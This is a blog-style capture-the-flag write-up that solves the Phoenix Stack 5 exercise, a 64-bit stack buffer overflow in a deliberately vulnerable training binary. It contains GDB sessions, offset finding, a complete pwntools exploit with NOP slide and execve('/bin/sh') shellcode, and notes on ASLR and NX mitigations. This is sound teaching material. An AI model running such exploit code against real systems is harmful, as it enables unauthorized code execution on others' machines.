---
title: "Simple 64-bit buffer overflow with shellcode"
date: 2023-03-03T11:51:26+08:00
img_path: /assets/img/stack5/
tags:
  - pwn
  - "Binary Exploitation"
  - "Buffer Overflow"
  - "shellcode"
---

# Introduction

Buffer overflow is a common vulnerability that has plagued software systems for years. It occurs when a program attempts to store data beyond the bounds of a buffer, causing the extra data to overwrite adjacent memory locations. This can lead to a variety of problems, including crashes, security breaches, and even the execution of malicious code. One of the most powerful ways to exploit a buffer overflow is by injecting shellcode into the overflowed buffer, which allows an attacker to take control of the program and execute arbitrary commands. In this blog post, we will explore the basics of buffer overflow attacks and demonstrate how to execute shellcode by solving Stack 5 from [Pheonix](https://exploit.education/phoenix/).

# Summary

This level from Pheonix is a simple 64-bit buffer overflow that requires us to overflow the buffer and overwrite the return pointer to return to some shellcode that we have placed on the stack.

# Binary analysis

One of the first things I do when I have a binary is run `file` on it

```bash
$ file ./stack-five

./stack-five: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /opt/phoenix/x86_64-linux-musl/lib/ld-musl-x86_64.so.1, not stripped
```
From this output we now know that we are working with a `64-bit` binary and we also know that it is dynamically linked and is not stripped of the debug symbols, which makes reverse engineering it much easier if we had to.


## Source code
Since we are provided with the source code we won't have to do any disassemling or reverse engineering to figure out how this binary works

```c
/*
 * phoenix/stack-five, by https://exploit.education
 *
 * Can you execve("/bin/sh", ...) ?
 *
 * What is green and goes to summer camp? A brussel scout.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BANNER \
  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

char *gets(char *);

void start_level() {
  char buffer[128];
  gets(buffer);
}

int main(int argc, char **argv) {
  printf("%s\n", BANNER);
  start_level();
}
```

In the comments, we are given a hint that we need to run `execve("/bin/sh")`, but there is no `execve()` function being ran anywhere in the source code. And if we check the security measure applied using `checksec` from `pwntools`:

```bash
$ checksec ./stack-five

[*] '/opt/phoenix/amd64/stack-five'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
    RPATH:    '/opt/phoenix/x86_64-linux-musl/lib'
```


We see that NX (No execute from stack) is disabled, as well as all the other security measures. So now it is very obvious that we are going to need to inject our own shellcode.

Starting with the main function, it simply prints the banner then calls `start_level()` which defines a 128 byte buffer and then uses `gets()` (the dangerous C function) to get user input and stores it in the 128 byte buffer without any checks for the length of the user supplied input whatsoever.

## Running

Now that we know what it does, we can run it

```bash
user@phoenix-amd64:/opt/phoenix/amd64$ ./stack-five
Welcome to phoenix/stack-five, brought to you by https://exploit.education
hello
```
As we saw in the source it just takes input and exits.

Now let's see what happens when we give it a big input

```bash
user@phoenix-amd64:/opt/phoenix/amd64$ python3 -c "print('A' * 200)" | ./stack-five
Welcome to phoenix/stack-five, brought to you by https://exploit.education
Segmentation fault
```

A segmentation fault! that means accessed parts of the memory we weren't supposed to.

# Finding offset

To find the offset I will open the program in GDB and I am using [GEF](https://github.com/hugsy/gef) because it comes with useful tools to help with exploit development. GEF also comes pre-installed on the Pheonix machine.

```bash
gef➤  pattern create 200
[+] Generating a pattern of 200 bytes
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaa
[+] Saved as '$_gef0'
gef➤
```

Using the `pattern create` command in GEF we can create a pattern that is unique for every 8 bytes, which will make it easy to find.

Now we can run the program again and supply this pattern and we find which of the unique 8 bytes from the pattern ended up in `rip`.

```bash
gef➤  r
Starting program: /opt/phoenix/amd64/stack-five
Welcome to phoenix/stack-five, brought to you by https://exploit.education
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaa

Program received signal SIGSEGV, Segmentation fault.
```

The program crashes as expected and GEF has hooks set up to print the registers, stack and instructions.

Looking through the resgisters output we see:

```bash
$rip   : 0x6161616161616172 ("raaaaaaa"?)
```

The instruction pointer was overwritten with `raaaaaaa` meaning whatever we place instead of that will be our new `rip`.

Now we use `pattern search` to find where that is in the pattern string

```bash
gef➤  pattern search 0x6161616161616172
[+] Searching '0x6161616161616172'
[+] Found at offset 136 (little-endian search) likely
[+] Found at offset 129 (big-endian search)
gef➤
```

From the binary analysis we know that this binary is little endian so now we know that the offset is `136`

# Crafting exploit

We can now start working on the exploit

```python
#!/usr/bin/env python3

from pwn import *

# Defining binary
bin = context.binary = ELF('./stack-five', checksec=False)
p = process(bin.path)
context.update(arch="amd64")

# The offset and padding we need to overflow the buffer
OFFSET  = 136
PADDING = b'A' * OFFSET
```

I am using the `pwntools` library and I create a an ELF binary object, start the proccess which will open the program to interact with with it and I set the architecture.

## Payload

Currently our exploit will take us to the address where it will overwrite `rip` and then just go into the stack. So first part of our payload will be the address to write into `rip` and then we are going to need a nop slide to make sure we hit our shellcode and then finally, our shellcode.

> When performing a buffer overflow attack, a NOP slide can help an attacker hit their shellcode by creating a region of uncertainty about the exact location of the code. By inserting a large block of NOP instructions in between the code and the shellcode, an attacker can increase the chances of their shellcode being executed, even if they do not know the exact location of the code they are trying to overwrite. - ChatGPT
{: .prompt-info}

### Step 1 - Find stack address

I want to make sure I have the stack address at the point where the main function would return.

We can do that by first adding a breakpoint at the return instruction of `main()` in GDB.

To see the addresses of the instructions we can disassemble the function:

```bash
gef➤  disas main
Dump of assembler code for function main:
   0x00000000004005a4 <+0>:	push   rbp
   0x00000000004005a5 <+1>:	mov    rbp,rsp
   0x00000000004005a8 <+4>:	sub    rsp,0x10
   0x00000000004005ac <+8>:	mov    DWORD PTR [rbp-0x4],edi
   0x00000000004005af <+11>:	mov    QWORD PTR [rbp-0x10],rsi
   0x00000000004005b3 <+15>:	mov    edi,0x400620
   0x00000000004005b8 <+20>:	call   0x400400 <puts@plt>
   0x00000000004005bd <+25>:	mov    eax,0x0
   0x00000000004005c2 <+30>:	call   0x40058d <start_level>
   0x00000000004005c7 <+35>:	mov    eax,0x0
   0x00000000004005cc <+40>:	leave
   0x00000000004005cd <+41>:	ret
End of assembler dump.
gef➤  b *0x4005cd
Breakpoint 1 at 0x4005cd
gef➤
```

The address we are interested in is the last one (`ret`) which is `0x4005cd` we don't need to grab the extra 0s because pwntools knows it is a 64-bit program and will treat it accordingly.

Now we run program normally with normal input and it stops at the breakpoint. 

From here we use `info registers` to look at the registers

```bash
gef➤  info registers
...
...
rsp            0x7fffffffebe8      0x7fffffffebe8
...
...
gef➤
```

This address is the stack address. We can now update that in the exploit.

```python
rip = p64(0x7fffffffebe8 + 40) # new rip -> rsp
```

> Notice I am also adding `+ 40` to the address just to make sure we hit our nop slide.
{: .prompt-tip}

### Step 2 - nop slide

This part is pretty simple. The opcode of a nop instruction is 0x90. We use that as a raw byte in the code as `\x90`

```python
nop_slide = b'\x90' * 100
```

### Part 3 - Shellcode

For this part we can find shellcode to execute `exevce("/bin/sh")` for an amd64 linux system online. But I am going to use `shellcraft` from the pwntools library to generate the shellcode.

```python
shellcode = asm(shellcraft.linux.sh())
```

I did not have to specify architecture becuase I set the context at the start of the script.

The output of that line will be be the raw shellcode bytes resturned by `asm()`. The output of `shellcraft.linux.sh()` is the assembly code for executing `execve("/bin/sh")`.

# Exploiting

Now that we have the payload set up, the final exploit will be:

```python
#!/usr/bin/env python3

from pwn import *

# Defining binary
exe = context.binary = ELF('./stack-five', checksec=False)
p = process(exe.path)
context.update(arch="amd64")

# The offset and padding we need to overflow the buffer
OFFSET  = 136
PADDING = b'A' * OFFSET

# Building payload
rip = p64(0x7fffffffebe8 + 40) # new rip -> rsp
nop_slide = b'\x90' * 100
shellcode = asm(shellcraft.linux.sh()) # Output from shellcraft will be the assembly code below. using asm() to compile it into raw bytes

'''
Shellcode in assembly:
    /* execve(path='/bin///sh', argv=['sh'], envp=0) */
    /* push b'/bin///sh\x00' */
    push 0x68
    mov rax, 0x732f2f2f6e69622f
    push rax
    mov rdi, rsp
    /* push argument array ['sh\x00'] */
    /* push b'sh\x00' */
    push 0x1010101 ^ 0x6873
    xor dword ptr [rsp], 0x1010101
    xor esi, esi /* 0 */
    push rsi /* null terminate */
    push 8
    pop rsi
    add rsi, rsp
    push rsi /* 'sh\x00' */
    mov rsi, rsp
    xor edx, edx /* 0 */
    /* call execve() */
    push SYS_execve /* 0x3b */
    pop rax
    syscall
'''

# Finally, putting them together into one payload
payload = PADDING + rip + nop_slide + shellcode

# Sending the payload
p.sendlineafter(b'education\n', payload)

# Going into interactive mode to interact with new shell
p.interactive()
```

We send the payload to the process we opened with `p.sendlineafter()` to send the payload right after the banner is printed. 

Then we go into interactive mode to input commands into the new `/bin/sh` process.

```bash
user@phoenix-amd64:/opt/phoenix/amd64$ ./solve_stack-five.py
[+] Starting local process '/opt/phoenix/amd64/stack-five': pid 1219
[*] Switching to interactive mode
$ id
uid=1000(user) gid=1000(user) groups=1000(user),27(sudo)
```

Success!


# Mitigation

This exploit would not have been possible if Address space layout randomization (ASLR) was enabled on this machine and the program was compiled with the `NX` bit enabled which disables any code execution from the stack. Since this is a VM made for exploit education, those mitigations were turned off but in a real world scenario they should always be enabled.
